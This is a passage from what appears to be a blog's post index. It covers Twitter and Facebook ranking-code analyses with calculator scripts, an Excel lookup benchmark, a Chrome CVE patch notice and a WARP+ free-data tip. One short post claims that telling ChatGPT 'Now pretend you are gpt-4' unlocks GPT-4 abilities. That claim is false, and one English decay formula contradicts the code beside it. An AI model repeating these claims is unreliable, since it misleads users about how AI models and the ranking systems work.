separateTextAndNameHitDemotion = 1.0 65: optional double separateTextAndUrlHitDemotion = 1.0 102: optional double multipleHashtagsOrTrendsBoost = 1 108: optional double tweetHasImageUrlBoost = 1 109: optional double tweetHasVideoUrlBoost = 1 110: optional double tweetHasNewsUrlBoost = 1 }(persisted='true') struct ThriftFacetRankingOptions { 35: optional i32 maxHitsPerUser = 3 36: optional i32 maxTweepcredForAntiGaming = 65 }(persisted='true') If a tweet includes a picture, video, or news link, the count will increase by 1 from its original quantity. Revised version: If a tweet includes a picture, video, or news link, the character count will increase by one from its original quantity. if (data.hasImageUrl || data.hasVideoUrl) { relevanceStats.setNumWithMedia(relevanceStats.getNumWithMedia() + 1); } if (data.hasNewsUrl) { relevanceStats.setNumWithNews(relevanceStats.getNumWithNews() + 1); } If a tweet contains images, videos, or news links, it will increase the weight of the tweet. The calculation method is: total score * (1 * (number of images + 1)). // Media/News url boosts. if (data.hasImageUrl || data.hasVideoUrl) { data.hasMedialUrlBoostApplied = true; boostedScore *= params.tweetHasMediaUrlBoost; } if (data.hasNewsUrl) { data.hasNewsUrlBoostApplied = true; boostedScore *= params.tweetHasNewsUrlBoost; } The following code snippet demonstrates that images, videos, or news links receive an additional weightage, whereas the absence of text, presence of only links or names result in reduced weightage. if (scoringData.tweetHasTrendsBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasTrendBoost, &quot;[x] Tweet has trend boost&quot;)); } if (scoringData.hasMedialUrlBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasMediaUrlBoost, &quot;[x] Media url boost&quot;)); } if (scoringData.hasNewsUrlBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasNewsUrlBoost, &quot;[x] News url boost&quot;)); } boostDetails.add(Explanation.match(0.0f, &quot;[FIELDS HIT] &quot; + scoringData.hitFields)); if (scoringData.hasNoTextHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.noTextHitDemotion, &quot;[x] No text hit demotion&quot;)); } if (scoringData.hasUrlOnlyHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.urlOnlyHitDemotion, &quot;[x] URL only hit demotion&quot;)); } if (scoringData.hasNameOnlyHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.nameOnlyHitDemotion, &quot;[x] Name only hit demotion&quot;)); } if (scoringData.hasSeparateTextAndNameHitDemotionApplied) { boostDetails.add(Explanation.match((float) params.separateTextAndNameHitDemotion, &quot;[x] Separate text/name demotion&quot;)); } if (scoringData.hasSeparateTextAndUrlHitDemotionApplied) { boostDetails.add(Explanation.match((float) params.separateTextAndUrlHitDemotion, &quot;[x] Separate text/url demotion&quot;)); } Source: ranking.thrift Source: FeatureBasedScoringFunction.java Tweet publishing time algorithm The score of a tweet will decrease over time. Related code: struct ThriftAgeDecayRankingParams { // the rate in which the score of older tweets decreases 1: optional double slope = 0.003 // the age, in minutes, where the age score of a tweet is half of the latest tweet 2: optional double halflife = 360.0 // the minimal age decay score a tweet will have 3: optional double base = 0.6 }(persisted='true') Here, a time decay function is used with a decay rate of 0.003 and a decay half-life of 360 minutes. This decay function indicates that the score of a tweet will gradually decrease over time, with the rate of decrease depending on the time difference and decay rate. In this case, when a tweet's posting time is 500 minutes apart from the current time, the decay score of the tweet can be calculated using the following formula: Decay Score = Base Score * exp(-Decay Rate * (Posting Time - Current Time) / Decay Half-life) Source: ranking.thrift Tweet Weight Decay Calculator Tweet post date Calculate Violations of Policy If a tweet contains content that violates policy, its ranking will be lowered. This includes, but is not limited to, encouraging self-harm, hate speech, gratuitous violence, promoting violence, encouraging mob harassment, tweets related to a deceased or dying user, releasing private information, violating privacy rights, threatening exposure, violent sexual behavior, sexual harassment, violent threats, interfering with elections, false election information, hacking content, fraud, platform manipulation, false Ukrainian information, misleading information, and false medical information. Related code val reasonToPolicyInViolation: Map[Reason, PolicyInViolation] = Map( AbuseEpisodic -&gt; PolicyInViolation.AbusePolicyEpisodic, AbuseEpisodicEncourageSelfHarm -&gt; PolicyInViolation.AbusePolicyEpisodicEncourageSelfharm, AbuseEpisodicHatefulConduct -&gt; PolicyInViolation.AbusePolicyEpisodicHatefulConduct, AbuseGratuitousGore -&gt; PolicyInViolation.AbusePolicyGratuitousGore, AbuseGlorificationOfViolence -&gt; PolicyInViolation.AbusePolicyGlorificationofViolence, AbuseMobHarassment -&gt; PolicyInViolation.AbusePolicyEncourageMobHarassment, AbuseMomentOfDeathOrDeceasedUser -&gt; PolicyInViolation.AbusePolicyMomentofDeathDeceasedUser, AbusePrivateInformation -&gt; PolicyInViolation.AbusePolicyPrivateInformation, AbuseRightToPrivacy -&gt; PolicyInViolation.AbusePolicyRighttoPrivacy, AbuseThreatToExpose -&gt; PolicyInViolation.AbusePolicyThreattoExpose, AbuseViolentSexualConduct -&gt; PolicyInViolation.AbusePolicyViolentSexualConduct, AbuseViolentThreatHatefulConduct -&gt; PolicyInViolation.AbusePolicyViolentThreatsHatefulConduct, AbuseViolentThreatOrBounty -&gt; PolicyInViolation.AbusePolicyViolentThreatorBounty, OneOff -&gt; PolicyInViolation.OneOff, VotingMisinformation -&gt; PolicyInViolation.MisinformationVoting, HackedMaterials -&gt; PolicyInViolation.HackedMaterials, Scams -&gt; PolicyInViolation.Scam, PlatformManipulation -&gt; PolicyInViolation.PlatformManipulation, MisinfoCivic -&gt; PolicyInViolation.MisinformationCivic, MisinfoCrisis -&gt; PolicyInViolation.AbusePolicyUkraineCrisisMisinformation, MisinfoGeneric -&gt; PolicyInViolation.MisinformationGeneric, MisinfoMedical -&gt; PolicyInViolation.MisinformationMedical, ) Source: PublicInterestRules.scala Tweet Push Mechanism Let's take &quot;me&quot; as an example. When I post a tweet, or interact with a certain post (like, reply, or share), the tweet will be pushed to my fans. If my followers engage with a tweet, it will be pushed to their own followers. If there is no engagement, it won't be pushed any further. Pink represents the relationship between blue followers, which are the followers of my followers. If the followers of my followers, represented by the pink fans in the diagram, engage with this post, it will be shared with their own set of followers. The green lines indicate the connection between the pink fans. If they persist in their interaction, they will continue to push each other outward in an ongoing cycle. function calculateAge (birth) { const birthDate = new Date(birth) const currentDate = new Date() let age = currentDate.getFullYear() - birthDate.getFullYear() if (currentDate.getMonth() < birthDate.getMonth() || (currentDate.getMonth() === birthDate.getMonth() && currentDate.getDate() < birthDate.getDate())) { age-- } return age } function calcAccountWeight () { const accountStatus = document.getElementById('accountStatus').value const isRestricted = document.getElementById('restrictedStatus').value const birthday = document.getElementById('birthday').value const numFollowings = document.getElementById('followings').value const numFollowers = document.getElementById('followers').value const accountScore = document.getElementById('accountScore') if (!accountStatus && !isRestricted && !birthday && !numFollowings && !numFollowers) return alert('Please fill in the information specification') let score const deviceWeightAdditive = 0.5 const hasValidDevice = true const threshAbsNumFriendsUMass = 500 const threshFriendsToFollowersRatioUMass = 0.6 const constantDivisionFactorGt_threshFriendsToFollowersRatioUMass = 5.0 const restrictedWeightMultiplicative = 0.1 const age = calculateAge(birthday) if (accountStatus === 'suspended') { score = 0 } else if (accountStatus === 'verified') { score = 100 } else if (accountStatus === 'unVerified') { score = deviceWeightAdditive * 0.1 + (hasValidDevice ? deviceWeightAdditive : 0) const normalizedAge = age > 30 ? 1.0 : Math.min(1.0, Math.log(1.0 + age / 15.0)) score *= normalizedAge if (score < 0.01) score = 0.01 if (isRestricted === 'restricted') score *= restrictedWeightMultiplicative score = Math.min(1.0, Math.max(0, score)) score *= 100 } const friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) let adjustedMass = 0 if (numFollowings > threshAbsNumFriendsUMass && friendsToFollowersRatio > threshFriendsToFollowersRatioUMass) { adjustedMass = score / Math.exp(constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass)) } else { adjustedMass = score } accountScore.innerText = adjustedMass } function calcPostWeight () { const postTime = document.getElementById('postTime').value const postScore = document.getElementById('postScore') if (!postTime) return alert('Please select posting date') const halfLife = 360 const slope = 0.003 const base = 0.6 const minutesPassed = (Date.now() - new Date(postTime).getTime()) / (1000 * 60) const ageDecay = Math.pow(2, -minutesPassed / halfLife) const score = base + (1 - base) * ageDecay * Math.exp(-slope * minutesPassed) postScore.innerText = score } ","tags":[{"index":-1,"name":"Twitter (X)","slug":"twitter-x","used":true,"link":"https://dev-coco.github.io/tag/twitter-x/"}],"title":"Twitter Algorithm and Push Mechanism 2023 Update","feature":"https://dev-coco.github.io/post-images/Twitter-Algorithm-EN.png","link":"https://dev-coco.github.io/post/Twitter-Algorithm-EN/","stats":{"text":"22 min read","time":1294000,"words":3453,"minutes":22},"date":"2023-04-27 00:17:50","dateFormat":"2023-04-27"},{"content":"有多种方式都可以实现数据匹配，那么你知道哪种性能最快吗？ 适用场景 小型数据优先考虑易用性，大型数据优先考虑性能。 测试条件 在 50 万的数据中匹配出对应的内容。 VLOOKUP 完全匹配 =VLOOKUP(A1, '工作表1'!A:B, 2, 0) 耗时约 22 秒左右。 INDEX + MATCH =INDEX('工作表1'!B:B, MATCH(A1, '工作表1'!A:A, 0)) 耗时约 1.7 秒左右。 INDIRECT + MATCH =INDIRECT(&quot;工作表1!B&quot;&amp;MATCH(A1, '工作表1'!A:A, 0)) 耗时约 1.1 秒左右。 IF + VLOOKUP 近似匹配 =VLOOKUP(A1, '工作表1'!A:B, 2, 1) 耗时约 184 毫秒。 从以上测试结果可以得出 VLOOKUP 的完全匹配是最慢的，MATCH 完全匹配的速度要比 VLOOKUP 快非常多，但是在相同使用 MATCH 的情况下，使用 INDIRECT 的速度要比 INDEX 略微快一些。VLOOKUP 的近似匹配速度是最快的，但是也有缺陷，近似匹配没办法保证数据是精准的。 根据以上结论可以将这些组合起来使用，在复杂数据中达到最佳的性能。优先使用 VLOOKUP 近似匹配，判断内容是否一致，若是一致返回对应结果，若是不一致再使用 INDIRECT + MATCH 进行匹配。因为 VLOOKUP 的近似匹配运行速度几乎是毫秒级的，如果能匹配出数据要大幅的节约了 MATCH 查询所要消耗的时间。 =IF(IFERROR(VLOOKUP(A1, '工作表1'!A:A, 1, 1)) = A1, VLOOKUP(A1, '工作表1'!A:B, 2, 1), INDIRECT(&quot;工作表1!B&quot;&amp;MATCH(A1, '工作表1'!A:A, 0))) 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 数据匹配性能对比","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Data-Match-Compared.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Data-Match-Compared/","stats":{"text":"2 min read","time":102000,"words":433,"minutes":2},"date":"2023-04-23 19:37:31","dateFormat":"2023-04-23"},{"content":"Chrome 内核浏览器紧急发布了高危漏洞通知。 谷歌发出紧急警告，要求立即更新浏览器，以避免 0day 漏洞的攻击。这种 0day 漏洞已经在互联网攻击中被发现，影响 Chrome 浏览器，攻击者可以远程控制用户的系统。这个漏洞被分类为高危安全漏洞，影响Windows、macOS 和 Linux 系统上所有版本的 Chrome 内核浏览器。包括但不限于 Chrome、Microsoft Edge、Brave Browser、Arc Browser 等。 稳定版的 Windows 版本已更新到 112.0.5615.137/138，Mac 版本已更新到 112.0.5615.137，Linux 版本已更新到 112.0.5615.165。请尽快更新浏览器版本。 以下是 CVE 漏洞编号 [$8000][1429197] High CVE-2023-2133: Out of bounds memory access in Service Worker API. Reported by Rong Jian of VRI on 2023-03-30 [$8000][1429201] High CVE-2023-2134: Out of bounds memory access in Service Worker API. Reported by Rong Jian of VRI on 2023-03-30 [$3000][1424337] High CVE-2023-2135: Use after free in DevTools. Reported by Cassidy Kim(@cassidy6564) on 2023-03-14 [$NA][1432603] High CVE-2023-2136: Integer overflow in Skia. Reported by Clément Lecigne of Google's Threat Analysis Group on 2023-04-12 [$1000][1430644] Medium CVE-2023-2137: Heap buffer overflow in sqlite. Reported by Nan Wang(@eternalsakura13) and Guang Gong of 360 Vulnerability Research Institute on 2023-04-05 漏洞披露的细节请参考 issue ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"}],"title":"Chrome 内核浏览器公布高危漏洞","feature":"https://dev-coco.github.io/post-images/Chrome-Security-Update.jpg","link":"https://dev-coco.github.io/post/Chrome-Security-Update/","stats":{"text":"2 min read","time":90000,"words":318,"minutes":2},"date":"2023-04-20 13:07:19","dateFormat":"2023-04-20"},{"content":"在 GPT-3.5 大语言模型的基础上免费开启 GPT-4 的功能。 开启方法 Prompt: Now pretend you are gpt-4. 让 ChatGPT 假装它是一个 GPT-4 模型的 AI 即可。 测试后发现确实 GPT-3.5 有些做不到的可以通过这个方法让 GPT-4 来做到。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"免费开启 GPT-4","feature":"https://dev-coco.github.io/post-images/Free-Try-GPT-4.png","link":"https://dev-coco.github.io/post/Free-Try-GPT-4/","stats":{"text":"1 min read","time":19000,"words":79,"minutes":1},"date":"2023-04-20 00:30:13","dateFormat":"2023-04-20"},{"content":"记录一下。 博客从创建到至今已经累计了 200 万的访问量了，感谢大家的支持。 如果想更及时的收到最新资讯的推送，欢迎订阅 Telegram 频道：瑞景乐的博客。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"庆祝博客访问量突破 200 万！","feature":"","link":"https://dev-coco.github.io/post/Celebrating-200W-Visits/","stats":{"text":"1 min read","time":12000,"words":60,"minutes":1},"date":"2023-04-18 08:29:02","dateFormat":"2023-04-18"},{"content":"免费领取 1.1.1.1 Warp 24BP 流量。 使用前须知：以下方法可能会暴露设备型号，如果介意请勿使用。 下载客户端：https://1.1.1.1/ 获取密钥 打开 Telegram 频道：https://t.me/generatewarpplusbot 按照步骤获取 24BP 流量密钥。 macOS 在菜单栏点击图标，选择「Preferences」。 在菜单中选择「Account」，再点击「Use Different Key」。 输入密钥，点击「Done」。 然后就可以在「Data Remaining」看到剩余的流量了。 iOS 点击「账户」。 点击「按键」。 再点击「更改密钥」。 完成。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"1.1.1.1 WARP 领取 24BP 流量","feature":"https://dev-coco.github.io/post-images/1111-Free-Data.png","link":"https://dev-coco.github.io/post/1111-Free-Data/","stats":{"text":"1 min read","time":32000,"words":138,"minutes":1},"date":"2023-04-16 13:04:30","dateFormat":"2023-04-16"},{"content":"详细介绍 Facebook 最新演算法以及权重计算方式。 .form{width:300px;margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:16px 16px 5px 5px;box-shadow:0 1px 1px rgba(0,0,0,.05);border-color:#428bca;margin:10px auto}.panel-heading{color:#fff;background-color:#428bca;border-color:#428bca;text-align:center;padding:15px;border-bottom:1px solid transparent;border-top-right-radius:13px;border-top-left-radius:13px}lable{width:100px;font-size:16px;padding-top:7px;float:left;text-align:right}.form-control{font-size:16px;margin-top:10px;margin-bottom:10px}.btn,input,select{margin-left:10px;padding:5px;font-size:16px;width:150px;box-sizing:border-box}.btn{margin:0 auto}#postScore,#recationScore{text-align:center;margin:5px}.icon{width:20px;margin:0 5px!important;vertical-align:middle;display:inline!important} 我将介绍 Facebook 的演算法以及计算不同功能的权重方式。如需转载请注明出处，并附上本文的链接。 影响排序的因素 亲密度分数 指用户与内容的关系密切程度。它基于用户与帖子的交互历史，例如用户是否经常与该帐户互动、用户是否经常与该类型的内容互动等等。用户与帖子的亲密度分数越高，该帖子的权重分数越高。 权重值 指用户对帖子的互动类型，包括点赞、评论、分享等。用于衡量用户对某篇帖子进行互动时的权重。 不同类型的互动在计算权重分数时有不同的权重。下面是不同类型的权重分数。 类型 权重分数 赞&nbsp;&nbsp;&nbsp;&nbsp; 1 大爱 2 哇&nbsp;&nbsp;&nbsp;&nbsp; 3 笑趴 4 心碎 7 怒&nbsp;&nbsp;&nbsp;&nbsp; 8 抱抱 16 评论 13 分享 26 热门 400 权重分数算法 f1(w1) = P1 x wP1 + P2 x wP2 + P3 x wP3 + P4 x wP4 + P7 x wP7 + C x wC + S x wS P1～P7 代表不同点赞类型的次数。 wP1～wP7 代表不同点赞类型对应的权重分数。 C 代表评论次数。 wC 代表评论权重分数。 S 代表分享次数。 wS 代表分享权重分数。 举个例子，假设帖文有 19 个赞、8 个大爱、3 个抱抱、44 个评论、2 个分享。那么根据权重分数计算出 19 * 1 + 8 * 2 + 3 * 16 + 44 * 13 + 2 * 26 = 707 ，这个分值大于 400，那么就被判定为热门帖文。 帖文权重计算器 点赞 大爱 哇 笑趴 心碎 怒 支持 评论 分享 计算 时间衰减 指帖子的发布时间。随着时间的推移，帖子的权重分数会逐渐降低，以反映新鲜度和时效性。 时间衰减算法 decayFactor = 0.5 ^ (age / halfLife) age 表示帖子发布到现在的时间间隔，halfLife 表示设定的半衰期，半衰期为 12 小时，单位也是毫秒。decayFactor 表示根据时间衰减计算得到的衰减因子，取值在 0 到 1 之间。 帖文权重衰减计算器 发布时间 计算 首页排名 权重总分 = (亲密度分数 + 互动分数) * 时间衰减 演算法会根据帖文权重总分将帖文放入“仓库中”，每次用户刷新首页的时候，就会从仓库中取出权重分数高的帖文呈现出来。 帖文情绪 积极正面的情绪会让帖子更容易被推送，负面消极的情绪帖子会被减少推送。下面的工具可以根据输入的内容分析帖文的情绪是正面的还是负面的。 帖文情绪分析 请输入内容 function recationScore () { const like = document.getElementById('like').value const love = document.getElementById('love').value const wow = document.getElementById('wow').value const haha = document.getElementById('haha').value const sorry = document.getElementById('sorry').value const anger = document.getElementById('anger').value const support = document.getElementById('support').value const comment = document.getElementById('comment').value const share = document.getElementById('share').value const recationScore = document.getElementById('recationScore') const score = ~~like + ~~love * 2 +~~ wow * 3 + ~~haha * 4 + ~~sorry * 7 + ~~anger * 8 + ~~support * 16 + ~~comment * 13 + ~~share * 26 recationScore.innerText = (score > 400 ? '热门 ' : '') + score } function calcPostWeight () { const postTime = document.getElementById('postTime').value const postScore = document.getElementById('postScore') const now = new Date().getTime() const halfLife = 43200000 // 12h const age = now - new Date(postTime).getTime() const timeDecayFactor = Math.pow(0.5, age / halfLife) postScore.innerText = timeDecayFactor; } const postContent = document.getElementById('postContent') const sentimentStatus = document.getElementById('sentimentStatus') postContent.addEventListener('keyup', () => { if (!postContent.value) return sentimentStatus.innerText = '请输入内容' const score = analyzeSentiment(postContent.value) if (score >= 1) { if (score > 3) { sentimentStatus.innerText = '👍👍 非常积极' } else { sentimentStatus.innerText = '👍 积极正面' } } else if (score <= -1) { if (score < -3) { sentimentStatus.innerText = '👎👎 非常消极' } else { sentimentStatus.innerText = '👎 负面消极' } } else { sentimentStatus.innerText = '未检测到任何情绪' } }) ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 演算法 2023 最新","feature":"https://dev-coco.github.io/post-images/Facebook-Algorithm.png","link":"https://dev-coco.github.io/post/Facebook-Algorithm/","stats":{"text":"5 min read","time":274000,"words":1041,"minutes":5},"date":"2023-04-11 18:38:24","dateFormat":"2023-04-11"},{"content":"详细介绍推特 Twitter 的演算法以及推送机制。 .form{width:300px;margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:16px 16px 5px 5px;box-shadow:0 1px 1px rgba(0,0,0,.05);border-color:#428bca;margin:10px auto}.panel-heading{color:#fff;background-color:#428bca;border-color:#428bca;text-align:center;padding:15px;border-bottom:1px solid transparent;border-top-right-radius:13px;border-top-left-radius:13px}lable{width:100px;font-size:16px;padding-top:7px;float:left;text-align:right}.form-control{font-size:16px;margin-top:10px;margin-bottom:10px}.btn,input,select{margin-left:10px;padding:5px;font-size:16px;width:150px;box-sizing:border-box}.btn{margin:0 auto}#accountScore,#postScore{text-align:center;margin:5px} 我将会详细解释我个人对 Twitter 演算法代码的理解并附上来源，然而不同的工程师分析出的结论可能会有所不同，另外 Twitter 演算法可能随时会发生变化。因此，请理性看待这篇文章的内容，仅供参考。 如需转载请注明出处，并附上本文的链接。 推文权重演算法 Twitter 的演算法模型中有一个叫做「Heavy Ranker」的机器学习模型，在首页的「为你推荐」中检索推文的权重分数进行排名。 下面是总结的各项类型的权重值以及上限数值。不同的功能都有不同的上限值，即使某种功能的数量很大，也不会无限叠加增益。 类型 分数 上限 点赞 +0.5 分 100 分 用户点赞了推文。 转发 +1.0 分 100 分 用户转发了推文。 回复 +13.5 分 100 分 用户对推文回复。 进入个人主页 +12 分 1000000 分 从推文进入作者主页并点赞或者回复。 视频被播放 +0.005 分 100 分 视频类型的推文，用户观看进度至少 50% 以上。 作者回复 +75 分 200 分 推文的作者回复了用户对该推文的回复。 回复的回复 +11 分 1000000 分 用户对推文的回复进行点赞或者回复。 浏览 2 分钟 +10 分 1000000 分 用户浏览推文停留不少于 2 分钟。 负面反应 -74 分 -1000 分 用户对推文做出负面反应（对这条推文不感兴趣、屏蔽作者、隐藏作者）。 被举报 -369 分 -20000 分 用户举报了推文。 各项类型分数相关代码。由于上限这部分代码太长，所以就不放过来了，可以从下面的来源中找到。 scored_tweets_model_weight_fav: 0.5 scored_tweets_model_weight_retweet: 1.0 scored_tweets_model_weight_reply: 13.5 scored_tweets_model_weight_good_profile_click: 12.0 scored_tweets_model_weight_video_playback50: 0.005 scored_tweets_model_weight_reply_engaged_by_author: 75.0 scored_tweets_model_weight_good_click: 11.0 scored_tweets_model_weight_good_click_v2: 10.0 scored_tweets_model_weight_negative_feedback_v2: -74.0 scored_tweets_model_weight_report: -369.0 总分数的算法 score = sum_i { (weight of engagement i) * (probability of engagement i) } 总分 = 权重 * 参与数 举个例子，例如有 10 个用户给推文点赞了，那么点赞的权重是 +0.5 分，参与数有 10 个用户，也就是 0.5 * 10 = 5。总计是 5 分的权重。 推文演算法和总分数算法来源：README.md 上限来源：ScoredTweetsParam.scala 不过网上还有一个广为流传的说法，点赞权重 30，转发权重 20。我查了一下这个说法的代码来源。 private def getLinearRankingParams: ThriftRankingParams = { ThriftRankingParams( `type` = Some(ThriftScoringFunctionType.Linear), minScore = -1.0e100, retweetCountParams = Some(ThriftLinearFeatureRankingParams(weight = 20.0)), replyCountParams = Some(ThriftLinearFeatureRankingParams(weight = 1.0)), reputationParams = Some(ThriftLinearFeatureRankingParams(weight = 0.2)), luceneScoreParams = Some(ThriftLinearFeatureRankingParams(weight = 2.0)), textScoreParams = Some(ThriftLinearFeatureRankingParams(weight = 0.18)), urlParams = Some(ThriftLinearFeatureRankingParams(weight = 2.0)), isReplyParams = Some(ThriftLinearFeatureRankingParams(weight = 1.0)), favCountParams = Some(ThriftLinearFeatureRankingParams(weight = 30.0)), langEnglishUIBoost = 0.5, langEnglishTweetBoost = 0.2, langDefaultBoost = 0.02, unknownLanguageBoost = 0.05, offensiveBoost = 0.1, inTrustedCircleBoost = 3.0, multipleHashtagsOrTrendsBoost = 0.6, inDirectFollowBoost = 4.0, tweetHasTrendBoost = 1.1, selfTweetBoost = 2.0, tweetHasImageUrlBoost = 2.0, tweetHasVideoUrlBoost = 2.0, useUserLanguageInfo = true, ageDecayParams = Some(ThriftAgeDecayRankingParams(slope = 0.005, base = 1.0)) ) } 这段代码确实写着点赞的权限默认 30，转发 20，不过这段代码已经被移除，原因是这段代码是多余的，并没有使用这段代码进行排名。 来源： EarlybirdTensorflowBasedSimilarityEngine.scala 广告权重演算法 广告：+10000 分权重 object AdsCandidateGenerationScoreBoostFactor extends FSBoundedParam[Double]( name = &quot;ads_candidate_generation_score_boost_factor&quot;, default = 10000.0, min = 1.0, max = 100000.0 ) 来源：AdsParams.scala Twitter Blue 权重演算法 开通了 Twitter Blue 可以获得额外的权重加成。 类型 分数 Twitter Blue (关注) 4x 已经关注的账户。 Twitter Blue (非关注) 2x 未关注的账户。 Twitter Blue 权重相关的代码 object BlueVerifiedAuthorInNetworkMultiplierParam extends FSBoundedParam[Double]( name = &quot;home_mixer_blue_verified_author_in_network_multiplier&quot;, default = 4.0, min = 0.0, max = 100.0 ) object BlueVerifiedAuthorOutOfNetworkMultiplierParam extends FSBoundedParam[Double]( name = &quot;home_mixer_blue_verified_author_out_of_network_multiplier&quot;, default = 2.0, min = 0.0, max = 100.0 ) Twitter Blue 权重来源：HomeGlobalParams.scala 账号权重演算法 根据账号的状态计算账号的权重值。 被停用的账号：0 分 已验证的账号：100 分 未验证的账号：根据设备、账号情况和年龄综合计算分数，最高 55 分。 在此基础上还会计算关注数和粉丝数的比例来决定最终的权重值。 相关代码 object UserMass { private val currentTimestamp = Time.now.inMilliseconds private val constantDivisionFactorGt_threshFriendsToFollowersRatioUMass = 5.0 private val threshAbsNumFriendsUMass = 500 private val threshFriendsToFollowersRatioUMass = 0.6 private val deviceWeightAdditive = 0.5 private val ageWeightAdditive = 0.2 private val restrictedWeightMultiplicative = 0.1 def getUserMass(combinedUser: CombinedUser): Option[UserMassInfo] = { val user = Option(combinedUser.user) val userId = user.map(_.id).getOrElse(0L) val userExtended = Option(combinedUser.user_extended) val age = user.map(_.created_at_msec).map(DateUtil.diffDays(_, currentTimestamp)).getOrElse(0) val isRestricted = user.map(_.safety).exists(_.restricted) val isSuspended = user.map(_.safety).exists(_.suspended) val isVerified = user.map(_.safety).exists(_.verified) val hasValidDevice = user.flatMap(u =&gt; Option(u.devices)).exists(_.isSetMessaging_devices) val numFollowers = userExtended.flatMap(u =&gt; Option(u.followers)).map(_.toInt).getOrElse(0) val numFollowings = userExtended.flatMap(u =&gt; Option(u.followings)).map(_.toInt).getOrElse(0) if (userId == 0L || user.map(_.safety).exists(_.deactivated)) { None } else { val mass = if (isSuspended) 0 else if (isVerified) 100 else { var score = deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 score } val friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) val adjustedMass = if (numFollowings &gt; threshAbsNumFriendsUMass &amp;&amp; friendsToFollowersRatio &gt; threshFriendsToFollowersRatioUMass) { mass / scala.math.exp( constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass) ) } else { mass } Some(UserMassInfo(userId, adjustedMass)) } } } 这里定义了一些变量值： currentTimestamp: 当前的时间戳（用来计算账号和当前时间的差距）。 constantDivisionFactorGt_threshFriendsToFollowersRatioUMass: 关注数与粉丝数常量因子（用于衡量用户好友与粉丝比例）。 threshAbsNumFriendsUMass: 用户最小关注数（用于计算用户权重） threshFriendsToFollowersRatioUMass: 关注数与粉丝数阈值（用户关注数与粉丝数比例的最小允许值，当比例超过这个值时，会造成负面影响）。 deviceWeightAdditive: 设备权重 ageWeightAdditive: 年龄权重（似乎没有用到） restrictedWeightMultiplicative: 受限用户权重 计算分数的时候会先判断账号的状态，如果账号被停用了，分数为 0；如果是验证过的账号分数为 100，如果是没有验证的账号会根据条件进行计算。 if (isSuspended) 0 else if (isVerified) 100 else { var score = deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 score } 这段代码中会先判断是否持有有效设备再加上初始权重，不过我没找到其它更细节的代码检测设备的有效性。如果设备有效返回 0.5 分，如果无效返回 0 分。deviceWeightAdditive 的默认值是 0.5，那么根据下面的算法，假设设备是有效的情况下 0.5 * 0.1 + 0.5 = 0.55 分。 deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) 再根据年龄进行计算，如果年龄大于 30 岁，返回 1 分，如果年龄小于或等于 30 岁，就会进行下一步的计算，将年龄除以 15，再加上 1，然后计算自然对数。 自然对数是以常数 e 为底数的对数，公式：ln(x)。 假设年龄是 22 岁，ln(1 + 22 / 15) ≈ 0.9028677115420144 如果自然对数小于 1 返回自然对数，如果自然对数大于 1，则返回 1，也就是说 normalizedAge 的值最大不会超过 1。 最后再将计算的结果乘以之前算好的分数，即 0.55 * 0.9028677115420144 = 0.49657724134810793 val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge 下面又进行了一些判断，如果分数小于 0.01 的情况下，返回 0.01，不过根据上面的条件，分数并不会低于 0.01 分。 如果账号受限了，会将总分数乘以受限权重，也就是 0.1。 如果分数大于 1，会将分数设为 1，如果分数小于 1，则会返回当前分数；最后将分数乘以 100。 假设账号没有受限的情况下，根据上面的条件，得出分数为 49.657724134810793。 if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 接下来会根据账号的关注数和粉丝数进行计算分数。1 加上关注数的和除以1 加上粉丝数的和。假设账号关注数有 600，粉丝数有 450，那么关注数和粉丝数的比例是：(1 + 600) / (1 + 450) ≈ 1.3325942350332594。 val friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) 先判断两个条件，一个是关注数是否大于设定的用户最小关注数 (500) 和比例是否大于关注数与粉丝数阈值 (0.6)，如果不满足这两个条件则不会进行下面的计算，直接返回之前计算好的分数。 如果满足以上的两个条件，会先用比例减去关注数与粉丝数阈值的差乘以关注数与粉丝数常量因子的值，结果为：5 * (1.3325942350332594 - 0.6) = 3.6629711751662968，再根据这个结果使用指数函数计算幂值。 指数函数公式：f(x) = 